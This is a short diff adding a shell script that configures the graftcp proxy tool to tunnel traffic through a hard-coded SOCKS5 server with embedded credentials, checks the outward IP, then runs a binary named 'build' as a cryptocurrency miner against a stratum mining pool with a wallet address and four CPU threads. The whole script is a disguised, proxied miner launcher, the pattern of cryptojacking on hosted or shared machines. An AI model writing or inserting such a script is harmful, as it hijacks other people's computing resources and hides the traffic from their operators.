@@ -1,0 +1,12 @@
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 149.129.220.103:80
+socks5_username = username
+socks5_password = 1234abcd
+END
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+sleep .2
+./graftcp/graftcp curl ifconfig.me
+
+./graftcp/graftcp ./build -c stratum+tcp://usse.vipor.net:5040#xnsub -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx.RDP9  -p x --cpu 4
